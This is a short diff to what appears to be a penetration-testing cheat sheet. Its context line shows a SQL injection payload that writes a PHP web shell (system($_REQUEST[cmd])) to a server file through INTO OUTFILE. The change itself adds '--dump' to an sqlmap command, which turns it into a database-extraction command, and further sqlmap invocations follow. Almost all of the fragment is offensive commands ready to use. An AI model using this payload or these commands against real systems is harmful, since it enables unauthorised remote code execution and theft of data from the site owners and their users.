@@ -651,7 +651,7 @@ cn' union select "",'<?php system($_REQUEST[cmd]); ?>', "", "" into outfile '/va
 - SQLMap
 
 ```
-$ sqlmap -u <URL> --batch
+$ sqlmap -u <URL> --batch --dump
 $ sqlmap <URL> --data 'uid=1&name=test'
 $ sqlmap <URL> --data 'uid=1*&name=test'
 $ sqlmap <URL> --random-agent
